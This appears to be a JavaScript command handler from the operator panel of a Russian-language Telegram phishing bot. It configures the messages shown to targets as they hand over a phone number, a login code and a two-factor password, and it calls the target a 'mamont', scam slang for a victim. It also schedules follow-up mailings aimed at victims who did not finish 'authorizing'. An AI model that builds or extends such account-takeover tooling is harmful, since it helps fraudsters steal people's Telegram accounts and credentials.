import { bot } from "../../index.js";
import config from '../../../../config.json' assert { type: 'json' };
import states from "../../states.js";
import template from "../../../database/schemas/template.js";
import fs from 'fs/promises';
import path from 'path';
import axios from 'axios';

const reply_markup = {
    inline_keyboard: [
        [
            {
                text: '🔙 Назад',
                callback_data: 'b:templatesb'
            }
        ]
    ]
}

export default {
    name: "template",
    async exec(message, args) {
       
        if (!message.text) return;
        if (!args[0]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })

            return await bot.sendMessage(message.from.id, `*Введите сообщение после /start*`, {
                parse_mode: 'Markdown',
                reply_markup
            })
        }
        if (!args[1]) {
            if (message.photo) {
                try {
                    const photo = message.photo[message.photo.length - 1];
                    const file = await bot.getFile(photo.file_id);

                    const uploadDir = 'uploads';
                    await fs.mkdir(uploadDir, { recursive: true });

                    const fileName = `${Date.now()}_${message.from.id}.jpg`;
                    const relativePath = path.join(uploadDir, fileName);

                    const fileUrl = `https://api.telegram.org/file/bot${config.token}/${file.file_path}`;
                    const response = await axios({
                        method: 'get',
                        url: fileUrl,
                        responseType: 'arraybuffer'
                    });

                    await fs.writeFile(relativePath, response.data);

                    states.set(message.from.id, {
                        action: "template",
                        args: [...args, message.text, relativePath]
                    });
                  
                } catch (error) {
                    console.error('Ошибка при сохранении файла:', error);
                    states.set(message.from.id, {
                        action: "template",
                        args: [...args, message.text]
                    });
                   
                }
            } else {
                states.set(message.from.id, { action: "template", args: [...args, message.text] })
              
            }
            return await bot.sendMessage(message.from.id, `*Введите сообщение после ввода номера*

_❔ Пример: Введите k0d_`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[2] ) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*Введите сообщение после авторизации*`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[3]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*Введите сообщение если у пользователя стоит пароль*`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[4]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*Введите сообщение если пользователь ввел неверный пароль*`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[5]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*Введите сообщение если пользователь ввел неверный k0д*`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[6]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*Введите текст если мамонт вводит код не цифрами*`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[7]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*Введите текст если юзер просрочил авторизацию*`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[8]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*Введите текст при ошибке авторизации*`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[9]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*Введите текст ожидания кода*

_❔ Пример: Ожидайте..._`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }
        if (!args[10]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            const tempId = Date.now().toString();

            bot.addListener('callback_query', query => {
                if (query.data != tempId) return;
                states.set(message.from.id, { action: "template", args: [...args, message.text] })
                message.text = `Пропустить`
                bot.emit('message', message);
            })
            return await bot.sendMessage(message.from.id, `*Введите текст рассылки через 5, 10, 30, 60, 240 минут для тех кто авторизовался. 

💡 Авторизовался - тот кто прошел авторизацию.*`, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '❌ Пропустить',
                                callback_data: tempId
                            }
                        ],
                        ...reply_markup.inline_keyboard
                    ]
                }
            });
        }
        if (!args[11]) {
            if (message.raw === 'Пропустить') {
                states.set(message.from.id, { action: "template", args: [...args, message.raw, message.raw] })
                args.push('Пропустить', 'Пропустить', 'Пропустить')
            } else {
                states.set(message.from.id, { action: "template", args: [...args, message.text] })
                return await bot.sendMessage(message.from.id, `*Введите текст кнопки рассылки через 5, 10, 30, 60, 240 минут для тех кто авторизовался. 

💡 Автризовался - тот кто прошел авторизацию.*`, {
                    parse_mode: 'Markdown',
                    reply_markup
                });
            }
        }
        if (!args[12]) {
            states.set(message.from.id, { action: "template", args: [...args, message.raw] })
            const START = Date.now().toString();
            const LINK = (+START + 1).toString();

            bot.addListener('callback_query', query => {
                if (query.data != START && query.data != LINK) return;
                states.set(message.from.id, { action: "template", args: [...args, message.raw] })
                message.text = query.data == START ? `Старт` : 'Ссылка'
                bot.emit('message', message);
            })
            return await bot.sendMessage(message.from.id, `*Введите формат кнопки  рассылки через 5, 10, 30, 60, 240 минут для тех кто авторизовался. 

💡Старт - запускет бот заново. Ссылка - перенаправляет на Ваш ресурс.*`, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: 'Старт',
                                callback_data: START
                            },
                            {
                                text: 'Cсылка',
                                callback_data: LINK
                            }
                        ],
                        ...reply_markup.inline_keyboard
                    ]
                }
            });
        }
        if (!args[13]) {
            if (message.raw === 'Старт') {
                states.set(message.from.id, { action: "template", args: [...args] })
                args.push('Старт')
            } else if (message.raw === 'Ссылка') {
                states.set(message.from.id, { action: "template", args: [...args, message.raw] })
                return await bot.sendMessage(message.from.id, `*Введите ссылку*`, {
                    parse_mode: 'Markdown',
                    reply_markup
                });
            } else {
                return await bot.sendMessage(message.from.id, `*❌ Выберите кнопками*`, {
                    parse_mode: 'Markdown',
                    reply_markup
                });
            }
        }
        if (!args[14]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            const tempId = Date.now().toString();

            bot.addListener('callback_query', query => {
                if (query.data != tempId) return;
                states.set(message.from.id, { action: "template", args: [...args, message.text] })
                message.text = `Пропустить`
                bot.emit('message', message);
            })
            return await bot.sendMessage(message.from.id, `*Введите текст рассылки через 5, 10, 30, 60, 240 минут для тех кто не авторизовался. 

💡 Невторизовался - тот кто не прошел авторизацию.*`, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '❌ Пропустить',
                                callback_data: tempId
                            }
                        ],
                        ...reply_markup.inline_keyboard
                    ]
                }
            });
        }
        if (!args[15]) {
            if (message.raw === 'Пропустить') {
                states.set(message.from.id, { action: "template", args: [...args, message.raw, message.raw] });
                args.push('Пропустить', 'Пропустить', 'Пропустить');
            } else {
                states.set(message.from.id, { action: "template", args: [...args, message.text] })
                return await bot.sendMessage(message.from.id, `*Введите текст кнопки рассылки через 5, 10, 30, 60, 240 минут для тех кто не авторизовался. 

💡 Не авторизовался - тот кто не прошел авторизацию.*`, {
                    parse_mode: 'Markdown',
                    reply_markup
                });
            }
        }
        if (!args[16]) {
            states.set(message.from.id, { action: "template", args: [...args, message.raw] })
            const START = Date.now().toString();
            const LINK = (+START + 1).toString();

            bot.addListener('callback_query', query => {
                if (query.data != START && query.data != LINK) return;
                states.set(message.from.id, { action: "template", args: [...args, message.text] })
                message.text = query.data == START ? `Старт` : 'Ссылка'
                bot.emit('message', message);
            })
            return await bot.sendMessage(message.from.id, `*Введите формат кнопки  рассылки через 5, 10, 30, 60, 240 минут для тех кто не авторизовался. 

💡Старт - запускет бот заново. Ссылка - перенаправляет на Ваш ресурс.*`, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: 'Старт',
                                callback_data: START
                            },
                            {
                                text: 'Cсылка',
                                callback_data: LINK
                            }
                        ],
                        ...reply_markup.inline_keyboard
                    ]
                }
            });
        }
        if (!args[17]) {
            if (message.raw === 'Старт') {
                states.set(message.from.id, { action: "template", args: [...args] })
                args.push(`Старт`)
            } else if (message.raw === 'Ссылка') {
                states.set(message.from.id, { action: "template", args: [...args, message.raw] })
                return await bot.sendMessage(message.from.id, `*Введите ссылку*`, {
                    parse_mode: 'Markdown',
                    reply_markup
                });
            } else {
                return await bot.sendMessage(message.from.id, `*❌ Выберите кнопками*`, {
                    parse_mode: 'Markdown',
                    reply_markup
                });
            }
        }
        if (!args[18]) {
            states.set(message.from.id, { action: "template", args: [...args, message.text] })
            return await bot.sendMessage(message.from.id, `*Введите текст кнопки для отправки контакта*`, {
                parse_mode: 'Markdown',
                reply_markup
            });
        }

        const TEMPLATE_STRUCTURE = {
            0: { name: 'name', description: 'Название шаблона' },
            1: { name: 'start', description: 'Сообщение после /start' },
            2: { name: 'media_startbot', description: 'Медиафайл' },
            3: { name: 'code', description: 'Сообщение после ввода номера' },
            4: { name: 'auth', description: 'Сообщение после авторизации' },
            5: { name: 'password', description: 'Сообщение если стоит пароль' },
            6: { name: 'wrongPassword', description: 'Сообщение при неверном пароле' },
            7: { name: 'wrongCode', description: 'Сообщение при неверном коде' },
            8: { name: 'NaNCode', description: 'Сообщение если код не цифры' },
            9: { name: 'timeout', description: 'Сообщение при таймауте' },
            10: { name: 'error', description: 'Сообщение при ошибке' },
            11: { name: 'wait', description: 'Сообщение ожидания' },
            12: { name: 'mailing1h', description: 'Текст рассылки (авторизован)' },
            13: { name: 'button', description: 'Текст кнопки (авторизован)' },
            14: { name: 'type', description: 'Тип кнопки (авторизован)' },
            15: { name: 'url', description: 'URL кнопки (авторизован)' },
            16: { name: 'mailing1hUnauth', description: 'Текст рассылки (не авторизован)' },
            17: { name: 'buttonUnauth', description: 'Текст кнопки (не авторизован)' },
            18: { name: 'typeUnauth', description: 'Тип кнопки (не авторизован)' },
            19: { name: 'urlUnauth', description: 'URL кнопки (не авторизован)' }
        };

        const createParams = (args, hasMedia = false) => {
            const params = {};
            let mediaOffset = 0;

            Object.entries(TEMPLATE_STRUCTURE).forEach(([index, field]) => {
                const i = parseInt(index);
                
                if (field.name === 'media_startbot') {
                    params[field.name] = hasMedia ? args[i] : null;
                    mediaOffset = hasMedia ? 0 : -1;
                } else {
                    params[field.name] = args[i + mediaOffset];
                }
            });

            return params;
        };
        const hasMedia = args[1]?.includes('uploads');
        
        const params = createParams(args, hasMedia);

        await new template({
            id: Date.now(),
            owner: message.from.id,
            ...params,
            contact: message.raw
        }).save();

        // Для отладки
        console.log('Template structure:', {
            hasMedia,
            argsLength: args.length,
            params: Object.entries(params).map(([key, value]) => ({
                field: key,
                value: value,
                description: Object.values(TEMPLATE_STRUCTURE).find(f => f.name === key)?.description
            }))
        });

        states.delete(message.from.id);
        return await bot.sendMessage(message.from.id, `*✅ Шаблон успешно создан!*`, {
            parse_mode: 'Markdown',
            reply_markup
        });
    }
}